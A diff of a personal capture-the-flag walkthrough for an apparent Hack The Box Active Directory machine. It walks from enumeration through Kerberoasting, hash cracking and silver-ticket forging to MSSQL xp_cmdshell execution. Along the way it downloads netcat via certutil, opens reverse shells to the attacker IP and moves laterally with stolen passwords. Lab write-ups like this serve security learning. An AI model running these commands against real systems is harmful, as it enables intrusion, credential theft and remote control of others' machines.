@@ -1,4 +1,6 @@
-└─$ nmap -p- -sSCV 10.129.186.240  --min-rate 999   
+#### Info Enum
+`└─$ nmap -p- -sSCV 10.129.186.240  --min-rate 999`
+```
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
@@ -54,20 +56,26 @@ PORT     STATE SERVICE       VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-
+```
+from port 80:
+a) get a domain name and open port, a screenshot leaks a username, ksimpson.
+b) passwords.html,  NTLM auth is desables, passwd reseted will be the same as username
 http://10.129.186.240/salesorders.html
 dc1.scrm.local 4411
 
-└─$ nmap -sU  -p 4411 10.129.186.240  --min-rate 999
+`└─$ nmap -sU  -p 4411 10.129.186.240  --min-rate 999`
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 13:52 AEDT
 Nmap scan report for 10.129.186.240
 Host is up (0.079s latency).
 
 PORT     STATE         SERVICE
 4411/udp open|filtered unknown
+```
 
-└─$ ldapsearch -x -H ldap://10.129.186.240 -s base namingcontexts
+dig more info of AD via port 389
+`└─$ ldapsearch -x -H ldap://10.129.186.240 -s base namingcontexts`
+```
 # extended LDIF
 #
 # LDAPv3
@@ -90,8 +98,21 @@ result: 0 Success
 
 # numResponses: 2
 # numEntries: 1
+```
 
-└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-host dc1.scrm.local -k
+Enum domain users
+ntlm login is disabled, so all the enum and operations on the domain should change for other unnormal methods
+`└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-ip 10.129.186.240`
+```
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
+[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C09058A, comment: AcceptSecurityContext error, data 1, v4563
+```
+
+`└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-host dc1.scrm.local -k`
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 Password:
@@ -113,22 +134,15 @@ khicks                                                2021-11-02 02:36:08.897478
 sqlsvc                                                2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586 
 miscsvc                                               2021-11-04 05:07:47.993436  2022-05-30 22:37:41.376125 
 ksimpson                                              2021-11-04 11:30:57.166952  2026-01-23 18:49:59.448329 
+```
 
+smbclient won’t work, and I wasn’t able to get crackmapexec to work either.
 
-└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-ip 10.129.186.240
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+The Impactet script, smbclient.py (sometimes installed as impacket-smbclient) will work, using the -k option for Kerberos auth.
 
-Password:
-[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
-[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C09058A, comment: AcceptSecurityContext error, data 1, v4563
-
-└─$ impacket-getTGT scrm.local/ksimpson -dc-ip 10.129.186.240
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-Password:
-[*] Saving ticket in ksimpson.ccache
-
-└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local
+try same user/passwd on smb
+`└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local`
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 Type help for list of commands
@@ -164,8 +178,6 @@ Type help for list of commands
  close - closes the current SMB Session
  exit - terminates the server process (and this session)
 
-
-
 # shares
 ADMIN$
 C$
@@ -189,16 +201,19 @@ SYSVOL
 drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 .
 drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 ..
 -rw-rw-rw-     630106  Sat Nov  6 04:45:07 2021 Network Security Changes.pdf
-
+```
+```
 # mget Network Security Changes.pdf
+
 [*] Downloading Network Security Changes.pdf
 
 SQL database used by our HR software
 so we have removed all access to the SQL service for everyone apart from network administrators.
+```
 
 
-
-└─$ impacket-GetUserSPNs -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -request  
+`└─$ impacket-GetUserSPNs -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -request`
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
@@ -207,12 +222,12 @@ ServicePrincipalName          Name    MemberOf  PasswordLastSet             Last
 MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586             
 MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 03:32:02.351452  2026-01-23 18:29:12.229586             
 
-
-
 [-] CCache file is not found. Skipping...
 $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b13625a0c9dea85dd8d62e6bd2171736$f049bb6930307abdf62ec4ae36bdc552bfdce651d207260b6053ae2787241d114412c364ca8efc3fbf6686fefb12bd41c6d370b3d37c93d758cf4b5d18965664f9e03516bb0169ace73e292316f2a4d3705ed354c828e10c84e2f4fe8e2884cb1b012c40e72224f438802cd4dc555ae9e18ced2d0743c719c78f59d6d0e2526665185c59584f609977ab505ac4dd1134ed945c98b2a356f988340bde18ef7e6582cbf92bdac69665aa1b72dc1f3b43883ac8bc6c0f4e1d8e22576a84db1d67aa13f55e5fcb18567390f0944c90e850e03d2dbce212a6746d85001b2571a4a305ccb734a6c05f559d63bda292090e9d58e60b859a9bc19702980fe982a57b0a6fd0fda9c484a509d5a9f12dbca6d487972d6f040a6d26b22b9cd0a1b6d70c54a3ecc1a87b4f170e15ad65d304604f4b54b012be8341793c5f780ed6424aad2f601a1f04d55a29159b8e20c21685807ab35212246562b08f81c210f7d46c47e492da2a458f0e3a208601cfb6cf053b571d53733691446857bf655553ec850eb24548b8719d00c34ab7a6deebaa2c90dda7ab689ed7afa1d5e14c4a6978c0a06e2c1dbed5848c95eecada96e2a6f5493bd38cd17ced11b17643932ce84e77062fa6ab858d6201b9fdde64fb3d1a8230423334d03d3f97bf6760717514b60e497f188740747387b7cc4eae43a94e55563c7e381f6e960a4c554f60fe66cdb53cf7043992f8c826b4565e470c71f1a8b8691e4ae6a1495032eeebf77baad36a20b00aa68b0a96f7e7e54a0cbd5d2ffc7508c933ba08a20eb0842d7f054dcf56be1d70fbb31a36e9394ad56ca7bcbd5d57fd371cea6fc23c2f5fe789e608ec43710649f2405a18ea0f2c51f003b7d4c00de191d9e70f37ac6543058963c6e984c147f6ae058b0ae822b6e1a6b48f5f3d923f1a777de7d7f67b8a52e83a82ac70fadebaf60ac9a1336705496a0f508207346c62a780812c8cd97ff5084f93d0d3cacecd7d16ab1fca8552a7ff0cb84b720c044b85b16e8839581ee31d9e034006760f7f3be85695e276e97ad6cc4a6f3404360fdc846cce1d7ece9fdc8895e78fdad5a0cd178f6ebbbf65bd85cef9c287b2e9ecf8443d94a58757130c33d30eb6f353452fcd0ecadef7131f46ab499d28251ac80cfdacc8d102b16eccba13b267eb845ee500fe3cff71fb4f2d80eee3241dcc907e33c08b11a059641e933402d1e156ece760481991f2145f3b8dcff8b69a5212c3c0fb49c15d6bbcf46ea8d0e0f7c4ded46a02f1605845892e2fe71c9908d652e70c5d2d3fc0be962f667e5b00306723ce13d2a567949dd46817c13b21b1daa8ef6a115ee7d95d50e1cc5ad242dbf7390f92b74fb4d12aab372c6edff21dd0d53232e714f2ad24bb5b58b09d46bffa2c6d1933fae87e411cda04c99dac6e86b875342bfce62f109b93c2f5
+```
 
-─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt 
+`─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt `
+```
 f6561ffc5995412606f4ef42daa2815:Pegasus60
                                                           
 Session..........: hashcat
@@ -220,15 +235,18 @@ Status...........: Cracked
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
 
 sqlsvc Pegasus60
+```
 
 get the SID of domain
-└─$ netexec ldap 10.129.187.157 -u sqlsvc -p Pegasus60 -k --get-sid
+`└─$ netexec ldap 10.129.187.157 -u sqlsvc -p Pegasus60 -k --get-sid`
+```
 LDAP        10.129.187.157  389    DC1              [*] None (name:DC1) (domain:scrm.local)
 LDAP        10.129.187.157  389    DC1              [+] scrm.local\sqlsvc:Pegasus60 
 LDAP        10.129.187.157  389    DC1              Domain SID S-1-5-21-2743207045-1827831105-2542523200
-
+```
 method2 
-─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60 
+`─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60 `
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 KERB_VALIDATION_INFO 
@@ -339,31 +357,38 @@ ResourceGroupIds:
         Attributes:                      536870919 ,
     ] 
 Domain SID: S-1-5-21-2743207045-1827831105-2542523200
-
-
-└─$ impacket-getST -k -spn MSSQLSvc/dc1.scrm.local scrm.local/sqlsvc:Pegasus60@dc1.scrm.local -dc-ip dc1.scrm.local 
+```
+create the TGT for sqlsvc
+`└─$ impacket-getST -k -spn MSSQLSvc/dc1.scrm.local scrm.local/sqlsvc:Pegasus60@dc1.scrm.local -dc-ip dc1.scrm.local `
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting ST for user
 [*] Saving ticket in sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache
+```
 
-
-first of all we have to
-destroy our previous ticket as ksimpson using kdestroy
-
-└─$ export KRB5CCNAME=sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache 
+first of all we have to, destroy our previous ticket as ksimpson using kdestroy
+`└─$ export KRB5CCNAME=sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache `
                                                                                                               
-┌──(ed㉿kali)-[/tmp]
-└─$ klist     
+`└─$ klist`
+```
 Ticket cache: FILE:sqlsvc@MSSQLSvc_dc1.scrm.local@SCRM.LOCAL.ccache
 Default principal: ksimpson@SCRM.LOCAL
 
 Valid starting     Expires            Service principal
 01/23/26 19:01:13  01/24/26 04:49:59  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
 	renew until 01/24/26 18:49:59
+```
+but I cannot user this ticket to request service ticket - silver ticket.
 
+##### Access MSSQL
+crypted the plaintext passwd to ntlm format
+`iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4`
+(stdin)= b999a16500b87d17ec7f2e2a68778f05
 
-└─$ impacket-ticketer administrator -spn MSSQLSvc/dc1.scrm.local -dc-ip dc1.scrm.local -user sqlsvc -password Pegasus60 -nthash B999A16500B87D17EC7F2E2A68778F05 -domain dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 
+use it to create ticket for SPN 
+`└─$ impacket-ticketer administrator -spn MSSQLSvc/dc1.scrm.local -dc-ip dc1.scrm.local -user sqlsvc -password Pegasus60 -nthash B999A16500B87D17EC7F2E2A68778F05 -domain dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200`
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -378,8 +403,11 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] 	EncTicketPart
 [*] 	EncASRepPart
 [*] Saving ticket in administrator.ccache
+```
 
-└─$ impacket-mssqlclient -k dc1.scrm.local
+kdestroy the previous ticket and export this new one
+`└─$ impacket-mssqlclient -k dc1.scrm.local`
+```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Encryption required, switching to TLS
@@ -439,8 +467,12 @@ SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
 LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
 --------   -----------------   ----------   ---------------   -------------   
 MiscSvc    ScrambledEggs9900   scrm.local                90               0 
+```
 
-─$ pwsh
+#### remote access the computer
+use pwsh method
+`─$ pwsh`
+```
 PowerShell 7.5.2
 
 ┌──(ed㉿kali)-[/home/ed]
@@ -464,10 +496,12 @@ PS /home/ed> Install-Module -Name PSWSMan -Scope AllUsers
 PS /home/ed> Install-WSMan                                     
 WARNING: WSMan libs have been installed, please restart your PowerShell session to enable it in PowerShell    
 PS /home/ed> exit
+```
+for some reason, cannot login , show me errors
 
-for some reason, cannot login , show me the errors
-
-─$ impacket-mssqlclient -k dc1.scrm.local
+try method 2, use MSSQL cmdline
+`─$ impacket-mssqlclient -k dc1.scrm.local`
+```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami;
@@ -507,9 +541,11 @@ NULL
                6 Dir(s)  16,006,635,520 bytes free   
 
 NULL   
+```
 
-
-SQL (SCRM\administrator  dbo@master)> xp_cmdshell certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\sqlsvc\nc64.exe
+it works, then download nc and connect back to attack machine
+`SQL (SCRM\administrator  dbo@master)> xp_cmdshell certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\sqlsvc\nc64.exe`
+```
 output                                                
 ---------------------------------------------------   
 ****  Online  ****                                    
@@ -517,8 +553,10 @@ output
 CertUtil: -URLCache command completed successfully.  
 
 SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Users\sqlsvc\nc64.exe 10.10.16.42 8821 -e cmd.exe"
+```
 
-└─$ nc -nvlp 8821                              
+`└─$ nc -nvlp 8821       `      
+```
 listening on [any] 8821 ...
 connect to [10.10.16.42] from (UNKNOWN) [10.129.188.251] 51594
 Microsoft Windows [Version 10.0.17763.2989]
@@ -527,8 +565,11 @@ Microsoft Windows [Version 10.0.17763.2989]
 C:\Windows\system32>whoami
 whoami
 scrm\sqlsvc
+```
+the next step is to swtich to user MiscSvc
+for this step, check bloodhound, this user has privi to perform this aciton, otherwise I cannot switch user
 
-for this step, check bllodhound, this user has privi to perform this aciton, otherwise I cannot switch user
+```
 PS C:\Users> $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
 $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
 PS C:\Users> $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
@@ -536,13 +577,14 @@ $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc
 PS C:\Users> Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
 Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
 scrm\miscsvc
+```
+use this user to connect back
+`Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\miscsvc\nc64.exe}`
 
+`Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:\Users\miscsvc\nc64.exe 10.10.16.42 8822 -e cmd.exe}`
 
-Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { certutil.exe -urlcache -f http://10.10.16.42:/nc64.exe C:\Users\miscsvc\nc64.exe}
-
-Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:\Users\miscsvc\nc64.exe 10.10.16.42 8822 -e cmd.exe}
-
-└─$ nc -nvlp 8822            
+`└─$ nc -nvlp 8822 `
+```
 listening on [any] 8822 ...
 connect to [10.10.16.42] from (UNKNOWN) [10.129.188.251] 59592
 Microsoft Windows [Version 10.0.17763.2989]
@@ -587,12 +629,15 @@ Mode                LastWriteTime         Length Name
 -a----       27/01/2026     03:19          40507 20260127031951_m.zip                                                  
 -a----       27/01/2026     03:19           1625 MGJkNjRlOGMtMGI0OS00NzgzLThjYTYtMTI4OTJiZWQzYmMx.bin                  
 -a----       27/01/2026     03:06        1618189 SharpHound.ps1 
+```
 
-
+```
 Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { certutil.exe -urlcache -f http://10.10.16.194:/nc64.exe C:\Users\miscsvc\nc64.exe}
 
 Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:\Users\miscsvc\nc64.exe 10.10.16.194 8822 -e cmd.exe}
-
+```
+check the group and privi of this user
+```
 Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
 BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
 BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
@@ -605,8 +650,10 @@ SCRM\ITShare                                Group            S-1-5-21-2743207045
 SCRM\ITUsers                                Group            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group
 Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448 
-
-C:\Shares\IT\Apps\Sales Order Client>dir
+```
+check the smb folder
+`C:\Shares\IT\Apps\Sales Order Client>dir`
+```
 dir
  Volume in drive C has no label.
  Volume Serial Number is 5805-B4B6
@@ -621,13 +668,6 @@ dir
                2 Dir(s)  15,217,414,144 bytes free
 
 
-
-
-
-
-
-
-
 // ScrambleLib.ScrambleNetClient
 // Token: 0x0600002B RID: 43 RVA: 0x000023D4 File Offset: 0x000005D4
 public bool Logon(string Username, string Password)
@@ -640,9 +680,10 @@ public bool Logon(string Username, string Password)
 			Log.Write("Developer logon bypass used");
 			result = true;
 		}
+```
 
-
-
+cp this PE file with dll to win64 machine, and run it, enable the debug mode, view the log:
+```
 27/1/2026 4:34:23 pm	Uploading new order with reference 5
 27/1/2026 4:34:23 pm	Binary formatter init successful
 27/1/2026 4:34:23 pm	Order serialized to base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABNQYEAAAAAjU0BgUAAAAJUyBKZW5raW5zCQYAAAAAwPKCkl/eCAAAAAAAABRABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
@@ -656,16 +697,28 @@ public bool Logon(string Username, string Password)
 27/1/2026 4:34:24 pm	Parsing server response
 27/1/2026 4:34:24 pm	Response type = Success
 27/1/2026 4:34:24 pm	Upload successful
-
-
-└─$ nc 10.129.5.168 4411 
+```
+it seems interact with port 4411, base64-encoded serialized data. let put the info into nc to interact with this service
+`└─$ nc 10.129.5.168 4411 `
+```
 SCRAMBLECORP_ORDERS_V1.0.3;
 UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABNQYEAAAAAjU0BgUAAAAJUyBKZW5raW5zCQYAAAAAwPKCkl/eCAAAAAAAABRABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
 SUCCESS;
 SESSION_TIMED_OUT;
-
-
+```
+it works as experted, next we will put pyload into the nc
 Deserialization Attack
 use https://github.com/pwntester/ysoserial.net to generate the payload to set in "UPLOAD_ORDER;"
 
 this tool is installed on WIn, I met some errors when installing.
+
+If we gerate the paload of Deserialization string, we will get back a shell with NT
+
+#### lesson learned
+A very complex box, with some new feature I never met, plenty of tools included
+- use ntlm to create ticket fot a particular SPN, and generate NTLM hash
+- MSSQL commdand, MSSQL cmdshell
+- pwsh
+- DNSpy to view exe file source code again
+- ysoserial.exe to generate payload of deserial data
+- 
